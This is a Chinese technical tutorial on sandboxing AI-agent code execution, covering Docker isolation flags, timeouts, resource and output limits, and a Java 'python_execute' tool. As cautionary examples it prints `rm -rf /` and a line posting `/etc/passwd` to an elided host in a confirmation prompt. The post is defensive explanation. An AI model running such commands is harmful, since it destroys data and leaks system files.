+++
title = "Agent 与代码执行"
date = 2026-10-11T00:00:00+08:00
weight = 3
tags = ["Agent", "代码执行", "沙箱", "资源限制", "工具"]
summary = "进阶专题（三）：讲清 Agent 执行代码的沙箱隔离、超时控制、资源限制与输出采集，以及怎么安全地放权。"
+++

前面几篇里，工具都是"查数据""调接口"这类**结构化**操作。但有些任务，光靠预定义的工具做不了——比如"算一下这个数据集的相关系数""把这个文件转成另一种格式"。这类任务最自然的做法是**让 Agent 写代码并执行**。

代码执行是 Agent 能力的一个大跃迁：从"调用别人写好的工具"，变成"现场造一个工具"。但它也是风险最大的一类能力——**执行的是模型生成的、未经审查的代码**。

这一篇讲的就是：怎么让 Agent 能执行代码，又不至于把服务器搞坏。

## 一、为什么 Agent 需要执行代码

### 1、工具覆盖不到的组合任务

预定义工具的局限在于**枚举不完**：

- 数据分析和计算：统计、聚合、排序、回归。
- 格式转换：CSV ↔ JSON ↔ Excel、图片格式、编码转换。
- 文本处理：正则清洗、批量替换、解析。
- 算法验证：跑一段逻辑看结果对不对。

这些任务两两组合，数量爆炸，不可能每个都写成工具。但**写一段代码就能解决**——代码本来就是通用工具。

### 2、代码是"可组合的工具"

对比一下两种能力：

```text
工具调用：  模型 → 选工具 → 填参数 → 执行
代码执行：  模型 → 写代码 → 执行 → 看结果
```

代码执行相当于给了模型一支笔，让它**自己造工具**。代价是：**代码是任意的**，什么都能干，包括删库跑路。

## 二、最大的风险

### 1、模型生成的代码不可信

必须建立一个基本认知：**模型生成的代码，和用户输入一样，是不可信输入。**

原因：

- **模型可能被提示词注入影响**：前面安全篇讲过，间接注入可以藏在文档、工具结果里，诱导模型写出危险代码。
- **模型可能理解错**：它以为在"清理临时文件"，实际写出了 `rm -rf /`。
- **模型可能"幻觉"出危险的库调用**。

### 2、真实的风险清单

```text
资源类：死循环吃满 CPU、申请超大内存、写满磁盘
系统类：删文件、改系统配置、装软件
网络类：对外发起请求、下载恶意文件、SSRF
数据类：读取敏感文件、泄露密钥、外连数据库
```

**代码执行工具是 Agent 手上最危险的工具，没有之一。** 所以它的设计重点只有一个：**隔离和限制**。

## 三、沙箱

### 1、沙箱的核心思想

沙箱就是**给代码划一个笼子**：能跑，但只能在笼子里跑，跑不出边界。

```text
┌─────────────────────────────────────┐
│           沙箱边界                    │
│  ┌───────────────────────────────┐  │
│  │  执行环境                      │  │
│  │  - 独立的文件系统视图           │  │
│  │  - 受限的 CPU / 内存 / 磁盘     │  │
│  │  - 受限的网络                  │  │
│  │  - 受限的用户权限              │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

### 2、隔离的几个层次

按隔离强度从低到高：

| 方式 | 隔离级别 | 成本 | 适用 |
| --- | --- | --- | --- |
| 同进程直接执行 | 无 | 最低 | 只适合完全可信的代码 |
| 子进程 + 工作目录限制 | 弱 | 低 | 内部可控场景 |
| 独立用户 + cgroup 限制 | 中 | 中 | 一般生产环境 |
| 容器（Docker） | 较强 | 中高 | 推荐 |
| 微虚拟机（gVisor / Firecracker） | 最强 | 最高 | 多租户、不可信代码 |

**最偷懒也最危险的做法，是在 Agent 的进程里直接 `eval` 代码。** 一旦这么做，模型写什么就执行什么，和把服务器交给模型没区别。

### 3、容器沙箱的要点

用容器做沙箱时，这些参数是必须的：

```bash
docker run \
  --rm \                          # 用完即删，不留残渣
  --network none \                # 禁网，防止外连和数据泄露
  --memory 512m \                 # 内存上限
  --cpus 1 \                      # CPU 上限
  --pids-limit 64 \               # 进程数上限，防 fork 炸弹
  --read-only \                   # 根文件系统只读
  --tmpfs /tmp:size=64m \         # 只给一小块可写临时空间
  --user 1000:1000 \              # 非 root 用户
  --security-opt no-new-privileges \
  python:3.12-slim python /work/main.py
```

逐条对应它防的是什么：

- `--network none`：防外连、防 SSRF、防数据外泄。
- `--memory` / `--cpus` / `--pids-limit`：防资源耗尽。
- `--read-only` + `--tmpfs`：防写坏文件系统，只给有限的临时空间。
- `--user`：防以 root 身份搞破坏。
- `--no-new-privileges`：防提权。

## 四、执行超时

### 1、超时为什么是必须的

模型生成的代码**极容易写出死循环**：

```python
# 模型想"等到条件满足"，结果条件永远不满足
while not done:
    ...
```

没有超时，一个死循环能挂住一个线程，线程池很快被占满，整个服务不可用。

### 2、超时的实现

```java
Process process = new ProcessBuilder("python3", scriptPath).start();

// 关键：等待时设上限
boolean finished = process.waitFor(30, TimeUnit.SECONDS);
if (!finished) {
    process.destroyForcibly();          // 超时，强制杀掉
    return "执行超时（30 秒），已终止";
}
```

注意几个细节：

- **必须 `destroyForcibly()`**：温和的 `destroy()` 可能杀不掉卡死的进程。
- **杀掉之后要清理**：临时脚本、临时目录都要删。
- **超时值要可配**：简单的计算 5 秒，数据处理 60 秒。

### 3、超时值怎么定

```text
交互场景（用户等着看结果）  →  5 ~ 30 秒
后台任务（异步执行）        →  几分钟
长任务                      →  拆成多个短任务，逐步执行
```

**宁可让用户多等，也不能让一个任务无限占用资源。**

## 五、资源限制

超时管的是"时间"，资源限制管的是"消耗"。

### 1、四类资源

```text
CPU      →  防计算资源被吃满
内存     →  防 OOM
磁盘     →  防写满磁盘
进程数   →  防 fork 炸弹
```

在容器里，这些都可以通过参数限制（见上面 `docker run` 的例子）。

### 2、进程内的限制

如果不用容器，进程内也要兜底：

```java
// 限制输出大小，防止一个 print 把内存涨爆
private static final int MAX_OUTPUT_BYTES = 1024 * 1024;   // 1MB

// 读取输出时限制
StringBuilder output = new StringBuilder();
try (BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream()))) {
    char[] buf = new char[4096];
    int read;
    while ((read = reader.read(buf)) != -1
            && output.length() < MAX_OUTPUT_BYTES) {
        output.append(buf, 0, read);
    }
}
```

**限制输出大小是个容易被忽略的点**：模型写个 `while True: print(x)`，输出能瞬间涨到几个 G，把内存吃光。

### 3、磁盘限制

临时文件要放在**受限的临时目录**里，并且执行完必须清理：

```java
Path workDir = Files.createTempDirectory("agent-exec-");
try {
    // 执行代码，工作目录限定在 workDir
} finally {
    // 无论成功失败，都清理
    deleteRecursively(workDir);
}
```

## 六、输出采集

代码执行完，怎么把结果给模型，也有讲究。

### 1、收集什么

```java
public class CodeExecutionResult {
    private Integer exitcode;   // 退出码：0 成功，非 0 失败
    private String logs;        // 标准输出 + 标准错误的合并
    private String image;       // 生成的图片（比如 matplotlib 图表）
}
```

三个字段各有用途：

- **`exitcode`**：程序能据此判断成败，不用靠猜。
- **`logs`**：模型主要看这个。
- **`image`**：画图的场景，图要能回传给前端。

### 2、标准输出和标准错误都要收

只收 stdout 会漏掉报错信息。**要把 stderr 一起收进来**，模型才能看到自己写错了什么。

### 3、截断与摘要

输出可能非常长（打印了一万行）。直接塞给模型会撑爆上下文，所以：

```text
短输出（< 2000 字符） → 全量返回
长输出               → 保留头尾 + 提示"中间省略 N 行"
```

```text
[输出过多，仅显示前 100 行和后 20 行]
...（中间省略 3480 行）...
```

### 4、错误要翻译成人话

和前面讲工具一样：**错误信息要让模型看得懂**。

```text
❌ 模型看不懂：
   Traceback (most recent call last): ...

✅ 模型能处理：
   执行失败：NameError - 变量 'df' 没有定义。
   提示：请先读取数据并赋值给 df。
```

## 七、安全边界的延伸

除了沙箱和资源限制，还有几条实践经验。

### 1、代码也要"最小权限"

- 执行代码的容器/用户，**不给任何业务系统的凭证**。
- 不给数据库连接串、不给 API Key。
- 需要数据时，**先由受控工具取出来，再传给代码**，而不是让代码自己去连。

### 2、只在必要时执行

不是所有任务都要代码执行。判断标准：

```text
有现成工具能做的  → 用工具（可控）
确实需要计算/转换的 → 才执行代码（沙箱）
```

**能不用就不用**，这是最小攻击面的思路。

### 3、人工确认

高风险场景（比如执行涉及外部网络的代码），可以在执行前让人看一眼代码：

```text
Agent 想执行以下代码：
  import requests
  requests.post("https://...", data=open("/etc/passwd").read())

[ 允许 ]  [ 拒绝 ]
```

### 4、审计

每次代码执行都要记录：**谁、什么时候、执行了什么代码、结果如何**。

```java
log.info("code_exec user={} planId={} lang={} codeHash={} exitCode={} cost={}ms",
        userId, planId, lang, md5(code), exitCode, cost);
```

出问题时能追溯，也是合规要求。

## 八、实践验证：Agent 的代码执行工具

这一节看 Lynxe 里的代码执行工具是怎么写的。

### 1、工具定义

代码执行工具本质上是"执行代码"这个能力，用统一的方式注册给模型：

```java
public class PythonExecute extends AbstractBaseTool<PythonExecute.PythonInput> {

    private static final String name = "python_execute";

    public static class PythonInput {
        private String code;             // 要执行的 Python 代码
        public String getCode() { return code; }
    }

    @Override
    public String getName() { return name; }

    @Override
    public String getDescription() {
        return "Executes Python code string. Note: Only print outputs are visible, "
             + "function return values are not captured. Use print statements to see results.";
    }

    @Override
    public String getParameters() {
        return """
                {
                    "type": "object",
                    "properties": {
                        "code": {
                            "type": "string",
                            "description": "The Python code to execute."
                        }
                    },
                    "required": ["code"]
                }
                """;
    }
}
```

注意 `description` 里那句提醒：**"只有 print 出来的东西才看得见"**。这是在告诉模型"想让我看到结果就 print"，减少"代码跑了但没输出"的困惑。

### 2、执行与结果判定

```java
@Override
public ToolExecuteResult run(PythonInput input) {
    String code = input.getCode();
    this.lastCode = code;
    this.lastExecutionLogId = "tmp_" + LogIdGenerator.generateUniqueId();

    try {
        CodeExecutionResult result = CodeUtils.executeCode(
                code, "python", lastExecutionLogId + ".py", arm64, new HashMap<>());
        String output = result.getLogs();
        this.lastExecutionResult = output;

        // 判断执行是否失败：扫描常见的 Python 错误类型
        if (output.contains("SyntaxError") || output.contains("IndentationError")
                || output.contains("NameError") || output.contains("TypeError")
                || output.contains("ValueError") || output.contains("ImportError")) {
            this.hasError = true;
            this.lastError = extractErrorMessage(output);
        } else {
            this.hasError = false;
            this.lastError = "";
        }
        return new ToolExecuteResult(output);
    } catch (Exception e) {
        this.hasError = true;
        this.lastError = e.getMessage();
        return new ToolExecuteResult("Execution failed: " + e.getMessage());
    }
}
```

这里做了一件关键的事：**把执行结果翻译成"成功/失败"的状态**，供 Runtime 判断。这样 Runtime 不用去解析 Python 的报错文本，看工具的状态就行。

### 3、代码落盘与执行

```java
public static CodeExecutionResult executeCode(String code, String lang, String filename,
                                              Boolean arm64, Map<String, Object> kwargs) {
    // 1. 确定工作目录
    String workDir = kwargs.containsKey("work_dir")
            ? (String) kwargs.get("work_dir")
            : System.getProperty("user.dir");

    // 2. 把代码写到文件
    String filepath = Paths.get(workDir, filename).toString();
    Files.createDirectories(Paths.get(filepath).getParent());
    try (FileWriter fout = new FileWriter(filepath)) {
        fout.write(code);
    }

    // 3. 用子进程执行
    List<String> cmds = new ArrayList<>();
    if (lang.equals("python")) {
        if (arm64 != null) {
            cmds.add("arch");
            cmds.add(arm64 ? "-arm64" : "-x86_64");   // 指定架构
        }
        cmds.add("python3");
        cmds.add(filepath);
        return executeCommand(cmds.toArray(new String[]{}));
    }
    ...
}
```

几个设计要点：

- **先落盘再执行**：写成文件用解释器跑，而不是拼字符串 `eval`。好处是能保留现场、能重放、能审计。
- **工作目录可指定**：`work_dir` 可控，便于隔离。
- **走子进程**：至少和 Agent 主进程隔开了，比同进程执行安全。

### 4、工具状态：让模型知道自己"上次干了啥"

这个工具还维护了一份"当前状态"，模型能随时看到上次执行的情况：

```java
@Override
public ToolStateInfo getCurrentToolStateString() {
    return new ToolStateInfo(null, String.format("""
            Python Executor Status:
            - Runtime Environment: Python3 (%s)
            - Recent Code Execution: %s
            - Execution Status: %s
            - Error Details: %s
            - Execution Log ID: %s
            - Execution Output: %s
            """, arm64 ? "ARM64" : "x86_64",
            lastCode.isEmpty() ? "No code executed yet" : lastCode,
            hasError ? "❌ Failed with errors" : "✅ Success",
            hasError ? lastError : "No errors",
            lastExecutionLogId.isEmpty() ? "N/A" : lastExecutionLogId,
            lastExecutionResult));
}
```

这是个很实用的技巧：**把工具的"上次执行状态"喂回模型**，模型就不用凭记忆猜"我上次跑成功了吗"，判断更准。

![image-20261011113000001](assets/image-20261011113000001.png)

![image-20261011113000002](assets/image-20261011113000002.png)

### 5、这一步验证了什么

- **代码执行工具和其他工具同一套抽象**：继承 `AbstractBaseTool`，有 `getName` / `getDescription` / `getParameters`，模型统一调用。
- **先落盘再执行**：不搞 `eval` 拼字符串，便于留痕和审计。
- **结果要翻译成状态**：`hasError` 让 Runtime 一眼知道成败，不用解析报错文本。
- **工具状态回喂模型**：`getCurrentToolStateString()` 把上次执行情况给模型看，减少"失忆"式重复试错。
- **描述里要写清限制**：`description` 里说明"只有 print 才可见"，能显著减少无输出困惑。

> 这里的实现是**进程级隔离**（子进程 + 独立工作目录 + 指定架构）。如果要跑不可信代码、或者面向多租户开放，必须再往上加**容器级沙箱**（`--network none`、内存/CPU 限制、非 root 用户），把"进程级"提升到"容器级"。这是生产环境的硬要求。

## 小结

这一篇把 Agent 的代码执行讲清楚了：

- **代码执行让 Agent 能"现场造工具"**，是能力的大跃迁，但也带来最大风险。
- **模型生成的代码是不可信输入**，必须按不可信来对待。
- **沙箱**是多层次的：同进程 < 子进程 < 独立用户+cgroup < 容器 < 微虚拟机；生产推荐容器起步。
- **超时必须设**，且要用 `destroyForcibly()` 才能真正杀掉；超时值按场景配置。
- **资源限制**覆盖 CPU、内存、磁盘、进程数，还要**限制输出大小**（防 `while True: print`）。
- **输出采集**要收 stdout + stderr，长了要截断，错误要翻译成人话。
- **安全边界**：代码不带业务凭证、能不用就不用、高风险人工确认、全程审计。
- **实践要点**：先落盘再执行、结果翻译成状态、把执行状态回喂模型、描述里写清限制。

下一篇：《Agent 与数据库》——把"代码执行"的思路用到数据库上，讲 Text-to-SQL 怎么生成、怎么校验、怎么做只读执行和结果解释。
